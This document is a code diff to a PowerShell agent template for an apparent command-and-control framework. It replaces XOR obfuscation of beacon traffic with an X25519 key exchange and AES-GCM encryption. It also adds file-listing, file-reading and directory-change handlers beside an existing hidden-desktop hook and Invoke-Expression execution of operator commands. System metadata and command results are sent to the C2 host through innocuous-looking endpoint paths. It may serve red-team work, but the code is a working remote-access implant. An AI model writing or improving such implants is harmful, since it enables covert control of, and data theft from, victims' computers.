@@ -9,26 +9,136 @@ $VERIFY_SSL = ${{VERIFY_SSL}}
 
 $BASE_URL = "${C2_SCHEME}://${C2_HOST}:${C2_PORT}"
 
-function Invoke-XOREncryption {
-    param([string]$Data)
-    $key = [System.Text.Encoding]::UTF8.GetBytes('{{ENCRYPTION_KEY}}')
-    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
-    $encrypted = New-Object byte[] $dataBytes.Length
-    for ($i = 0; $i -lt $dataBytes.Length; $i++) {
-        $encrypted[$i] = $dataBytes[$i] -bxor $key[$i % $key.Length]
+$script:SERVER_PUB_HEX = '{{SERVER_PUB}}'
+$script:EphPriv = $null
+$script:HsKey = $null
+$script:SessionKey = $null
+
+function X25519-ScalarMult {
+    param([byte[]]$K, [byte[]]$U)
+    $kc = [byte[]]$K.Clone()
+    $kc[0] = $kc[0] -band 248
+    $kc[31] = ($kc[31] -band 127) -bor 64
+    $P = [System.Numerics.BigInteger]::Pow(2, 255) - 19
+    $A24 = [System.Numerics.BigInteger]121665
+    $ub = New-Object byte[] 33
+    [Array]::Copy($U, $ub, 32)
+    $uBI = New-Object System.Numerics.BigInteger($ub, $true, $false)
+    $x1 = $uBI; $x2 = [System.Numerics.BigInteger]::One; $z2 = [System.Numerics.BigInteger]::Zero
+    $x3 = $uBI; $z3 = [System.Numerics.BigInteger]::One; $swap = 0
+    $Mod = { param($v) $r = [System.Numerics.BigInteger]::Remainder($v, $P); if ($r -lt 0) { $r + $P } else { $r } }
+    for ($t = 254; $t -ge 0; $t--) {
+        $kt = ($kc[$t -shr 3] -shr ($t -band 7)) -band 1
+        $swap = $swap -bxor $kt
+        if ($swap -ne 0) { $tmp=$x2;$x2=$x3;$x3=$tmp; $tmp=$z2;$z2=$z3;$z3=$tmp }
+        $swap = $kt
+        $A = (& $Mod ($x2 + $z2)); $AA = (& $Mod ($A * $A))
+        $B = (& $Mod ($x2 - $z2)); $BB = (& $Mod ($B * $B))
+        $E = (& $Mod ($AA - $BB))
+        $C = (& $Mod ($x3 + $z3)); $D = (& $Mod ($x3 - $z3))
+        $DA = (& $Mod ($D * $A)); $CB = (& $Mod ($C * $B))
+        $x3 = (& $Mod ((& $Mod ($DA + $CB)) * (& $Mod ($DA + $CB))))
+        $z3 = (& $Mod ($x1 * (& $Mod ((& $Mod ($DA - $CB)) * (& $Mod ($DA - $CB))))))
+        $x2 = (& $Mod ($AA * $BB))
+        $z2 = (& $Mod ($E * (& $Mod ($AA + $A24 * $E))))
     }
-    return [Convert]::ToBase64String($encrypted)
+    if ($swap -ne 0) { $tmp=$x2;$x2=$x3;$x3=$tmp; $tmp=$z2;$z2=$z3;$z3=$tmp }
+    $inv = [System.Numerics.BigInteger]::ModPow($z2, $P - 2, $P)
+    $result = (& $Mod ($x2 * $inv))
+    $rb = $result.ToByteArray($true, $false)
+    $out = New-Object byte[] 32
+    [Array]::Copy($rb, $out, [Math]::Min($rb.Length, 32))
+    return $out
 }
 
-function Invoke-XORDecryption {
+function X25519-Basepoint { return ,([byte[]]@(9)+([byte[]]::new(31))) }
+
+function Invoke-HKDF {
+    param([byte[]]$IKM, [byte[]]$Info)
+    $salt = [Text.Encoding]::UTF8.GetBytes('sockpuppets-salt-v1')
+    $hmac1 = New-Object Security.Cryptography.HMACSHA256(,$salt)
+    $prk = $hmac1.ComputeHash($IKM)
+    $hmac2 = New-Object Security.Cryptography.HMACSHA256(,$prk)
+    $t = New-Object byte[] ($Info.Length + 1)
+    [Array]::Copy($Info, $t, $Info.Length)
+    $t[$Info.Length] = 1
+    $okm = $hmac2.ComputeHash($t)
+    return $okm[0..31]
+}
+
+function Invoke-AesGcmSeal {
+    param([byte[]]$Key, [string]$Plain)
+    $nonce = New-Object byte[] 12
+    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($nonce)
+    $aes = [Security.Cryptography.AesGcm]::new($Key)
+    $pt = [Text.Encoding]::UTF8.GetBytes($Plain)
+    $ct = New-Object byte[] $pt.Length
+    $tag = New-Object byte[] 16
+    $aes.Encrypt($nonce, $pt, $ct, $tag)
+    $out = New-Object byte[] (12 + $ct.Length + 16)
+    [Array]::Copy($nonce, 0, $out, 0, 12)
+    [Array]::Copy($ct, 0, $out, 12, $ct.Length)
+    [Array]::Copy($tag, 0, $out, 12+$ct.Length, 16)
+    return ,$out
+}
+
+function Invoke-AesGcmOpen {
+    param([byte[]]$Key, [byte[]]$Blob)
+    $nonce = $Blob[0..11]; $ct = $Blob[12..($Blob.Length-17)]; $tag = $Blob[($Blob.Length-16)..($Blob.Length-1)]
+    $aes = [Security.Cryptography.AesGcm]::new($Key)
+    $pt = New-Object byte[] $ct.Length
+    $aes.Decrypt($nonce, $ct, $tag, $pt)
+    return [Text.Encoding]::UTF8.GetString($pt)
+}
+
+function Invoke-Eph1Encrypt {
     param([string]$Data)
-    $key = [System.Text.Encoding]::UTF8.GetBytes('{{ENCRYPTION_KEY}}')
-    $dataBytes = [Convert]::FromBase64String($Data)
-    $decrypted = New-Object byte[] $dataBytes.Length
-    for ($i = 0; $i -lt $dataBytes.Length; $i++) {
-        $decrypted[$i] = $dataBytes[$i] -bxor $key[$i % $key.Length]
+    if ($script:SessionKey) {
+        $sealed = Invoke-AesGcmSeal -Key $script:SessionKey -Plain $Data
+        $result = New-Object byte[] (4 + $sealed.Length)
+        [Text.Encoding]::ASCII.GetBytes('AES1').CopyTo($result, 0)
+        $sealed.CopyTo($result, 4)
+        return [Convert]::ToBase64String($result)
     }
-    return [System.Text.Encoding]::UTF8.GetString($decrypted)
+    $priv = New-Object byte[] 32
+    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($priv)
+    $bp = X25519-Basepoint
+    $pub = X25519-ScalarMult -K $priv -U $bp
+    $serverPub = New-Object byte[] 32
+    for ($i=0;$i -lt 32;$i++) { $serverPub[$i] = [Convert]::ToByte($script:SERVER_PUB_HEX.Substring($i*2,2),16) }
+    $shared = X25519-ScalarMult -K $priv -U $serverPub
+    $script:EphPriv = $priv
+    $hsInfo = [Text.Encoding]::UTF8.GetBytes('sockpuppets-handshake-v1')
+    $script:HsKey = Invoke-HKDF -IKM $shared -Info $hsInfo
+    $sealed = Invoke-AesGcmSeal -Key $script:HsKey -Plain $Data
+    $payload = New-Object byte[] (32 + $sealed.Length)
+    $pub.CopyTo($payload, 0)
+    $sealed.CopyTo($payload, 32)
+    return "EPH1." + [Convert]::ToBase64String($payload)
+}
+
+function Invoke-Eph1Decrypt {
+    param([string]$Data)
+    if ($Data.StartsWith('EPH2.')) {
+        $raw = [Convert]::FromBase64String($Data.Substring(5))
+        $srvPub = $raw[0..31]
+        $rest = $raw[32..($raw.Length-1)]
+        $pt = Invoke-AesGcmOpen -Key $script:HsKey -Blob $rest
+        $shared2 = X25519-ScalarMult -K $script:EphPriv -U $srvPub
+        $combined = New-Object byte[] ($shared2.Length + $script:HsKey.Length)
+        $shared2.CopyTo($combined, 0)
+        $script:HsKey.CopyTo($combined, $shared2.Length)
+        $sessInfo = [Text.Encoding]::UTF8.GetBytes('sockpuppets-session-v1')
+        $script:SessionKey = Invoke-HKDF -IKM $combined -Info $sessInfo
+        $script:EphPriv = $null; $script:HsKey = $null
+        return $pt
+    }
+    if ($script:SessionKey) {
+        $raw = [Convert]::FromBase64String($Data)
+        if ([Text.Encoding]::ASCII.GetString($raw,0,4) -ne 'AES1') { throw 'ciphertext rejected' }
+        return Invoke-AesGcmOpen -Key $script:SessionKey -Blob $raw[4..($raw.Length-1)]
+    }
+    throw 'no session key'
 }
 
 function Invoke-SleepEncrypt {
@@ -77,9 +187,38 @@ function Get-SystemMetadata {
     return $metadata
 }
 
+function Invoke-NativeLs {
+    param([string]$Path = '.')
+    if ([string]::IsNullOrEmpty($Path)) { $Path = '.' }
+    try {
+        $items = Get-ChildItem -Path $Path -Force -ErrorAction Stop
+        $lines = @()
+        foreach ($item in $items) {
+            $prefix = if ($item.PSIsContainer) { 'd' } else { '-' }
+            $size = if ($item.PSIsContainer) { '0' } else { $item.Length.ToString() }
+            $lines += "$prefix $($size.PadLeft(12))  $($item.Name)"
+        }
+        if ($lines.Count -eq 0) { return "Directory is empty" }
+        return ($lines -join "`n")
+    } catch { return "Error: $($_.Exception.Message)" }
+}
+
 function Invoke-AgentCommand {
     param([string]$Command)
     if ($Command.StartsWith('__hd:')) { return (Invoke-HiddenDesktop $Command) }
+    if ($Command -eq 'pwd') { return (Get-Location).Path }
+    if ($Command -eq 'ls' -or $Command -eq 'dir') { return (Invoke-NativeLs '.') }
+    if ($Command.StartsWith('ls ') -or $Command.StartsWith('dir ')) {
+        return (Invoke-NativeLs ($Command.Substring($Command.IndexOf(' ') + 1).Trim()))
+    }
+    if ($Command.StartsWith('cat ') -or $Command.StartsWith('type ')) {
+        try { return [System.IO.File]::ReadAllText($Command.Substring($Command.IndexOf(' ') + 1).Trim()) }
+        catch { return "Error: $($_.Exception.Message)" }
+    }
+    if ($Command.StartsWith('cd ')) {
+        try { Set-Location ($Command.Substring(3).Trim()); return "Changed directory to $((Get-Location).Path)" }
+        catch { return "Error: $($_.Exception.Message)" }
+    }
     try {
         $output = Invoke-Expression $Command 2>&1 | Out-String
         if ([string]::IsNullOrEmpty($output)) {
@@ -163,11 +302,11 @@ function Start-Agent {
                     metadata = $metadata
                 } | ConvertTo-Json -Compress -Depth 4
 
-                $encrypted = Invoke-XOREncryption -Data $registerMsg
+                $encrypted = Invoke-Eph1Encrypt -Data $registerMsg
                 $response = Send-HTTPRequest -Url "$BASE_URL/submit-form" -Body $encrypted
 
                 if ($response) {
-                    $decrypted = Invoke-XORDecryption -Data $response
+                    $decrypted = Invoke-Eph1Decrypt -Data $response
                     $data = $decrypted | ConvertFrom-Json
                     if ($data.type -eq "registered" -or $data.type -eq "checkin_ack") {
                         $agentId = $data.agent_id
@@ -189,12 +328,12 @@ function Start-Agent {
                 results = $pendingResults
             } | ConvertTo-Json -Compress -Depth 4
 
-            $encrypted = Invoke-XOREncryption -Data $checkinMsg
+            $encrypted = Invoke-Eph1Encrypt -Data $checkinMsg
             $response = Send-HTTPRequest -Url "$BASE_URL/api/v1/update" -Body $encrypted
             $pendingResults = @()
 
             if ($response) {
-                $decrypted = Invoke-XORDecryption -Data $response
+                $decrypted = Invoke-Eph1Decrypt -Data $response
                 $data = $decrypted | ConvertFrom-Json
 
                 if ($data.type -eq "registered") {
